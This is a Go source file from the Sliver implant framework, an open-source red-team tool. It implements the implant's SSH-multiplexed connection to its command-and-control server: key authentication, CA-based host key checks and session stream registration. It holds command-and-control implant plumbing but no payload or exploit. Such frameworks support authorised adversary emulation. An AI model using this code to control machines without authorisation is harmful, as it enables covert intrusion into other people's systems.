package comm

/*
	Sliver Implant Framework
	Copyright (C) 2019  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	// {{if .Config.Debug}}
	"log"
	// {{end}}

	"crypto/x509"
	"encoding/pem"
	"errors"
	"fmt"
	"io"
	"net"
	"strings"
	"time"

	"github.com/golang/protobuf/proto"
	"golang.org/x/crypto/ssh"

	"github.com/bishopfox/sliver/protobuf/sliverpb"
	"github.com/bishopfox/sliver/sliver/constants"
)

// SetupClient - The Comm prepares SSH code and security details for a client connection.
func (comm *Comm) SetupClient(caCert []byte, key []byte, name string) (err error) {

	// The user is the implant. This is important: checked against the implant's certificates.
	comm.clientConfig.User = name

	// Private key is used to authenticate to the server/pivot.
	signer, err := ssh.ParsePrivateKey(key)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("SSH failed to parse Private Key: %s", err.Error())
		// {{end}}
		return
	}
	comm.clientConfig.Auth = []ssh.AuthMethod{ssh.PublicKeys(signer)}

	// This checks the key presented by the server/pivot.
	hostKeyCallback := func(hostname string, remote net.Addr, key ssh.PublicKey) error {

		pubKey := strings.TrimSpace(string(ssh.MarshalAuthorizedKey(key))) // Trimmed public key in PEM format

		sliverCACertPool := x509.NewCertPool()
		ok := sliverCACertPool.AppendCertsFromPEM(caCert)
		if !ok {
			return fmt.Errorf("Failed to parse SliverCA certificate")
		}

		block, _ := pem.Decode([]byte(pubKey))
		if block == nil {
			return fmt.Errorf("Failed to parse Certificate PEM")
		}
		cert, err := x509.ParseCertificate(block.Bytes)
		if err != nil {
			return fmt.Errorf("Failed to parse Certificate: %v", err)
		}

		opts := x509.VerifyOptions{
			DNSName: hostname,
			Roots:   sliverCACertPool,
		}

		// Verify the provided certificate.
		if _, err := cert.Verify(opts); err != nil {
			return fmt.Errorf("Failed to verify certificate: %v", err)
		}

		return nil
	}

	// Register the host key verification callback
	comm.clientConfig.HostKeyCallback = hostKeyCallback

	return
}

// InitClient - Sets up and start a SSH connection (multiplexer) around a logical connection/stream, or a Session RPC.
func (m *Comm) InitClient(conn net.Conn, isTunnel bool, caCert, key []byte) (sessionStream io.ReadWriteCloser, err error) {
	// {{if .Config.Debug}}
	log.Printf("Initiating SSH client connection...")
	// {{end}}

	// Return if we don't have what we need.
	if conn == nil {
		return nil, errors.New("net.Conn is nil, cannot init Comm")
	}

	// Pepare the SSH conn/security, and set keepalive policies/handlers.
	err = m.SetupClient(caCert, key, constants.SliverName)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("failed to setup SSH client connection: %s", err.Error())
		// {{end}}
		return nil, err
	}

	// We are the client of the C2 server here.
	m.sshConn, m.inbound, m.requests, err = ssh.NewClientConn(conn, "", m.clientConfig)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("failed to initiate SSH connection: %s", err.Error())
		// {{end}}
		return
	}

	// Serve pings & requests with keepalive policies, the same way for pivots or not.
	go m.serveRequests()

	// If the conn is not a tunnel, it means the session is not registered yet. Get and return a stream for this.
	if !isTunnel {
		sessionStream, err = m.initSessionClient()
		if err != nil {
			// {{if .Config.Debug}}
			log.Printf("failed to setup C2 stream: %s", err.Error())
			// {{end}}
			return
		}
	}

	// Everything is up and running, register the mux.
	Comms.Add(m)

	// Handle requests (pings) and incoming connections in the background.
	go m.serveActiveConnection()

	return
}

// initSessionClient - The multiplexer has just been created and set up, and we need to register
// the implant session for this physical connection. We create a dedicated stream and return it.
func (m *Comm) initSessionClient() (stream io.ReadWriteCloser, err error) {
	if m.sshConn == nil {
		// {{if .Config.Debug}}
		log.Printf("Tried to open channel on nil SSH connection")
		// {{end}}
		return
	}

	select {
	case ch := <-m.inbound:
		info := &sliverpb.ConnectionInfo{}
		proto.Unmarshal(ch.ExtraData(), info)

		if ch.ChannelType() != "session" || info.ID != "REGISTRATION" {
			err = ch.Reject(ssh.Prohibited, "")
			return nil, errors.New("Bad payload information for registration")
		}

		c2Stream, reqs, err := ch.Accept()
		if err != nil {
			return nil, err
		}
		go ssh.DiscardRequests(reqs)

		// {{if .Config.Debug}}
		log.Printf("Opened Session stream")
		// {{end}}

		stream = io.ReadWriteCloser(c2Stream)
		return stream, err

	case <-time.After(defaultNetTimeout):
		return nil, errors.New("[mux] timed out waiting muxed stream for RPC C2 layer")
	}
}
